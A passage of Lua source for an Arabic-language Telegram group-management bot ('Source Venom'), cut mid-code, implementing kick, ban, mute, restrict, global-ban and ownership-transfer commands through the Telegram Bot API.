tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"𖠧︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"𖠧︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم طرده من المجموعه")  
end,nil)
end
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,KickUser)
end
if text and text:match('^طرد (%d+)') and ChCheck(msg) then
local user = text:match('طرد (%d+)')
if not Constructor(msg) and DevAbs:get(Venom.."Abs:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'𖠧︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع طرد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"𖠧︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"𖠧︙لا استطيع طرد مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","𖠧︙تم طرده من المجموعه")  
end,nil)
end
end
end 
--     Source Venom     --
--          Ban           --
if Admin(msg) then
if text ==('حضر') or text ==('حظر') and ChCheck(msg) then
function BanReply(extra, result, success)
if not Constructor(msg) and DevAbs:get(Venom.."Abs:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'𖠧︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع حظر ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.sender_user_id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"𖠧︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"𖠧︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevAbs:sadd(Venom..'Abs:Ban:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم حظره من المجموعه") 
end,nil) 
end 
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanReply)
end end
if text and (text:match('^حضر @(.*)') or text:match('^حظر @(.*)')) and ChCheck(msg) then
local username = text:match('^حضر @(.*)') or text:match('^حظر @(.*)')
function BanUser(extra,result,success)
if not Constructor(msg) and DevAbs:get(Venom.."Abs:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'𖠧︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع حظر ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=result.id_,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"𖠧︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"𖠧︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, result.id_)
DevAbs:sadd(Venom..'Abs:Ban:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم حظره من المجموعه")  
end,nil) 
end
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanUser)
end
if text and (text:match('^حضر (%d+)') or text:match('^حظر (%d+)')) and ChCheck(msg) then
local user = text:match('حضر (%d+)') or text:match('حظر (%d+)')
if not Constructor(msg) and DevAbs:get(Venom.."Abs:Lock:KickBan"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'𖠧︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع حظر ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
tdcli_function({ID="ChangeChatMemberStatus",chat_id_=msg.chat_id_,user_id_=user,status_={ID="ChatMemberStatusKicked"},},function(arg,dp) 
if (dp and dp.code_ and dp.code_ == 400 and dp.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_,msg.id_,"𖠧︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !") 
return false  
end
if dp and dp.code_ and dp.code_ == 400 and dp.message_ == "USER_ADMIN_INVALID" then 
send(msg.chat_id_,msg.id_,"𖠧︙لا استطيع حظر مشرفين المجموعه") 
return false  
end
ChatKick(msg.chat_id_, user)
DevAbs:sadd(Venom..'Abs:Ban:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","𖠧︙تم حظره من المجموعه")  
end,nil) 
end
end
--     Source Venom     --
--         UnBan          --
if text ==('الغاء الحظر') or text ==('الغاء حظر') and ChCheck(msg) then
function UnBanReply(extra, result, success)
DevAbs:srem(Venom..'Abs:Ban:'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم الغاء حظره من المجموعه")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnBanReply)
end end
if text and (text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')
function UnBanUser(extra,result,success)
if result.id_ then
DevAbs:srem(Venom..'Abs:Ban:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم الغاء حظره من المجموعه")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnBanUser)
end
if text and (text:match('^الغاء الحظر (%d+)') or text:match('^الغاء حظر (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء الحظر (%d+)') or text:match('الغاء حظر (%d+)')
DevAbs:srem(Venom..'Abs:Ban:'..msg.chat_id_, user)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
ReplyStatus(msg,user,"Reply","𖠧︙تم الغاء حظره من المجموعه")  
end 
end 
--     Source Venom     --
--          Mute          --
if Admin(msg) then
if text ==('كتم') and ChCheck(msg) then
function MuteReply(extra, result, success)
if not Constructor(msg) and DevAbs:get(Venom.."Abs:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'𖠧︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع كتم ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
if DevAbs:sismember(Venom..'Abs:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙هو بالفعل مكتوم من المجموعه")  
else
DevAbs:sadd(Venom..'Abs:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم كتمه من المجموعه")  
end 
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteReply)
end end
if text and text:match('^كتم @(.*)') and ChCheck(msg) then
local username = text:match('^كتم @(.*)')
function MuteUser(extra,result,success)
if not Constructor(msg) and DevAbs:get(Venom.."Abs:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'𖠧︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع كتم ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
if DevAbs:sismember(Venom..'Abs:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","𖠧︙هو بالفعل مكتوم من المجموعه")  
else
DevAbs:sadd(Venom..'Abs:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم كتمه من المجموعه")  
end
end
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteUser)
end
if text and text:match('^كتم (%d+)') and ChCheck(msg) then
local user = text:match('كتم (%d+)')
if not Constructor(msg) and DevAbs:get(Venom.."Abs:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'𖠧︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع كتم ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
if DevAbs:sismember(Venom..'Abs:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","𖠧︙هو بالفعل مكتوم من المجموعه")  
else
DevAbs:sadd(Venom..'Abs:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","𖠧︙تم كتمه من المجموعه")  
end
end
end
--     Source Venom     --
--         UnMute         --
if text ==('الغاء الكتم') or text ==('الغاء كتم') and ChCheck(msg) then
function UnMuteReply(extra, result, success)
if not DevAbs:sismember(Venom..'Abs:Muted:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙هو ليس مكتوم لالغاء كتمه")  
else
DevAbs:srem(Venom..'Abs:Muted:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم الغاء كتمه من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnMuteReply)
end end
if text and (text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')
function UnMuteUser(extra,result,success)
if result.id_ then
if not DevAbs:sismember(Venom..'Abs:Muted:'..msg.chat_id_, result.id_) then
ReplyStatus(msg,result.id_,"Reply","𖠧︙هو ليس مكتوم لالغاء كتمه")  
else
DevAbs:srem(Venom..'Abs:Muted:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم الغاء كتمه من المجموعه")  
end
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnMuteUser)
end
if text and (text:match('^الغاء الكتم (%d+)') or text:match('^الغاء كتم (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء الكتم (%d+)') or text:match('الغاء كتم (%d+)')
if not DevAbs:sismember(Venom..'Abs:Muted:'..msg.chat_id_, user) then
ReplyStatus(msg,user,"Reply","𖠧︙هو ليس مكتوم لالغاء كتمه")  
else
DevAbs:srem(Venom..'Abs:Muted:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","𖠧︙تم الغاء كتمه من المجموعه")  
end
end 
end 
--     Source Venom     --
--          Tkeed           --
if Admin(msg) then
if text ==('تقييد') or text ==('تقيد') and ChCheck(msg) then
function TkeedReply(extra, result, success)
if not Constructor(msg) and DevAbs:get(Venom.."Abs:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'𖠧︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(result.sender_user_id_, result.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
DevAbs:sadd(Venom..'Abs:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تقيده من المجموعه")  
end
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),TkeedReply)
end end
if text and (text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')) and ChCheck(msg) then
local username = text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')
function TkeedUser(extra,result,success)
if not Constructor(msg) and DevAbs:get(Venom.."Abs:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'𖠧︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if result.id_ then
if RankChecking(result.id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع تقيد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
DevAbs:sadd(Venom..'Abs:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم تقيده من المجموعه")  
end
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,TkeedUser)
end
if text and (text:match('^تقييد (%d+)') or text:match('^تقيد (%d+)')) and ChCheck(msg) then
local user = text:match('تقييد (%d+)') or text:match('تقيد (%d+)')
if not Constructor(msg) and DevAbs:get(Venom.."Abs:Lock:MuteTked"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,'𖠧︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
return false
end
if RankChecking(user, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙لا تستطيع تقيد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
DevAbs:sadd(Venom..'Abs:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","𖠧︙تم تقيده من المجموعه")  
end
end
--     Source Venom     --
--         UnTkeed          --
if text ==('الغاء تقييد') or text ==('الغاء تقيد') and ChCheck(msg) then
function UnTkeedReply(extra, result, success)
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAbs:srem(Venom..'Abs:Tkeed:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم الغاء تقيده من المجموعه")  
end
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnTkeedReply)
end end
if text and (text:match('^الغاء تقييد @(.*)') or text:match('^الغاء تقيد @(.*)')) and ChCheck(msg) then
local username = text:match('^الغاء تقييد @(.*)') or text:match('^الغاء تقيد @(.*)')
function UnTkeedUser(extra,result,success)
if result.id_ then
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAbs:srem(Venom..'Abs:Tkeed:'..msg.chat_id_, result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم الغاء تقيده من المجموعه")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnTkeedUser)
end
if text and (text:match('^الغاء تقييد (%d+)') or text:match('^الغاء تقيد (%d+)')) and ChCheck(msg) then
local user = text:match('الغاء تقييد (%d+)') or text:match('الغاء تقيد (%d+)')
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevAbs:srem(Venom..'Abs:Tkeed:'..msg.chat_id_, user)
ReplyStatus(msg,user,"Reply","𖠧︙تم الغاء تقيده من المجموعه")  
end
end 
end
--     Source Venom     --
--         BanAll         --
if SecondSudo(msg) then
if text ==('حضر عام') or text ==('حظر عام') then
function BanAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Venom) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAbs:sismember(Venom..'Abs:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
return false 
end
ChatKick(result.chat_id_, result.sender_user_id_)
DevAbs:sadd(Venom..'Abs:BanAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم حظره عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),BanAllReply)
end end
if text and (text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')) then
local username = text:match('^حضر عام @(.*)') or text:match('^حظر عام @(.*)')
function BanAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(Venom) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAbs:sismember(Venom..'Abs:SecondSudo:',result.id_) and not Sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
return false 
end
if result.id_ then
ChatKick(msg.chat_id_, result.id_)
DevAbs:sadd(Venom..'Abs:BanAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم حظره عام من المجموعات")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,BanAllUser)
end
if text and (text:match('^حضر عام (%d+)') or text:match('^حظر عام (%d+)')) then
local user = text:match('حضر عام (%d+)') or text:match('حظر عام (%d+)')
if tonumber(user) == tonumber(Venom) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع حظر البوت عام*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
return false 
end
if DevAbs:sismember(Venom..'Abs:SecondSudo:',user) and not Sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
return false 
end
ChatKick(msg.chat_id_, user)
DevAbs:sadd(Venom..'Abs:BanAll:', user)
ReplyStatus(msg,user,"Reply","𖠧︙تم حظره عام من المجموعات")  
end
--     Source Venom     --
--         MuteAll        --
if text ==('كتم عام') then
function MuteAllReply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Venom) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.sender_user_id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevAbs:sismember(Venom..'Abs:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
return false 
end
DevAbs:sadd(Venom..'Abs:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم كتمه عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),MuteAllReply)
end end
if text and text:match('^كتم عام @(.*)') then
local username = text:match('^كتم عام @(.*)')
function MuteAllUser(extra,result,success)
if tonumber(result.id_) == tonumber(Venom) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(result.id_) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevAbs:sismember(Venom..'Abs:SecondSudo:',result.id_) and not Sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
return false 
end
if result.id_ then
DevAbs:sadd(Venom..'Abs:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم كتمه عام من المجموعات")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,MuteAllUser)
end
if text and text:match('^كتم عام (%d+)') then
local user = text:match('كتم عام (%d+)')
if tonumber(user) == tonumber(Venom) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع كتم البوت عام*", 1, 'md')
return false 
end
if SudoId(tonumber(user)) == true then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
return false 
end
if DevAbs:sismember(Venom..'Abs:SecondSudo:',user) and not Sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
return false 
end
DevAbs:sadd(Venom..'Abs:MuteAll:', user)
ReplyStatus(msg,user,"Reply","𖠧︙تم كتمه عام من المجموعات")  
end
--     Source Venom     --
--         UnAll          --
if text ==('الغاء عام') or text ==('الغاء العام') then
function UnAllReply(extra, result, success)
DevAbs:srem(Venom..'Abs:BanAll:', result.sender_user_id_)
DevAbs:srem(Venom..'Abs:MuteAll:', result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),UnAllReply)
end end
if text and (text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')) then
local username = text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')
function UnAllUser(extra,result,success)
if result.id_ then
DevAbs:srem(Venom..'Abs:BanAll:', result.id_)
DevAbs:srem(Venom..'Abs:MuteAll:', result.id_)
ReplyStatus(msg,result.id_,"Reply","𖠧︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙*المعرف غير صحيح*', 1, 'md')
end end 
resolve_username(username,UnAllUser)
end
if text and (text:match('^الغاء عام (%d+)') or text:match('^الغاء العام (%d+)')) then
local user = text:match('الغاء عام (%d+)') or text:match('الغاء العام (%d+)')
DevAbs:srem(Venom..'Abs:BanAll:', user)
DevAbs:srem(Venom..'Abs:MuteAll:', user)
ReplyStatus(msg,user,"Reply","𖠧︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
end
end
end
--     Source Venom     --
if (text == "تغير المطور الاساسي" or text == "نقل ملكيه البوت" or text == "تغيير المطور الاساسي" or text == "↫ تغير المطور الاساسي 𖠧") and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
send(msg.chat_id_, msg.id_,'𖠧︙يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
DevAbs:setex(Venom.."Abs:EditDev"..msg.sender_user_id_,300,true)
end
if DevAbs:get(Venom.."Abs:EditDev"..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_,'𖠧︙تم الغاء امر تغير المطور الاساسي')
DevAbs:del(Venom.."Abs:EditDev"..msg.sender_user_id_)
return false
end
if text and text:match("^(%d+)$") then 
tdcli_function ({ID = "GetUser",user_id_ = text},function(arg,dp) 
if dp.first_name_ ~= false then
DevAbs:del(Venom.."Abs:EditDev"..msg.sender_user_id_)
DevAbs:set(Venom.."Abs:NewDev"..msg.sender_user_id_,dp.id_)
if dp.username_ ~= false then DevUser = '\n𖠧︙المعرف ↫ [@'..dp.username_..']' else DevUser = '' end
local Text = '𖠧︙الايدي ↫ '..dp.id_..DevUser..'\n𖠧︙الاسم ↫ ['..dp.first_name_..'](tg://user?id='..dp.id_..')\n𖠧︙تم حفظ المعلومات بنجاح\n𖠧︙استخدم الازرار للتاكيد ↫ ⤈'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/setyes"},{text="لا",callback_data="/setno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
send(msg.chat_id_, msg.id_,"𖠧︙المعلومات خاطئه قم بالتاكد واعد المحاوله")
DevAbs:del(Venom.."Abs:EditDev"..msg.sender_user_id_)
end
end,nil)
return false
end
end
--     Source Venom     --
if msg.reply_to_message_id_ ~= 0 then
if text and text:match("^رفع مطي$") and not DevAbs:get(Venom..'Abs:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if DevAbs:sismember(Venom..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙هو مطي شرفع منه بعد😹💔") 
else
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم رفعه في قائمة المطايه") 
DevAbs:sadd(Venom..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source Venom     --
if msg.reply_to_message_id_ ~= 0  then
if text and text:match("^تنزيل مطي$") and not DevAbs:get(Venom..'Abs:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
function donky_by_reply(extra, result, success)
if not DevAbs:sismember(Venom..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙هو ليس مطي ليتم تنزيله") 
else
DevAbs:srem(Venom..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","𖠧︙تم تنزيله من قائمة المطايه") 
end end
getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
end end
--     Source Venom     --
if Admin(msg) then
if text and (text:match('^تقييد دقيقه (%d+)$') or text:match('^كتم دقيقه (%d+)$') or text:match('^تقيد دقيقه (%d+)$')) and ChCheck(msg) then 
local function mut_time(extra, result,success)
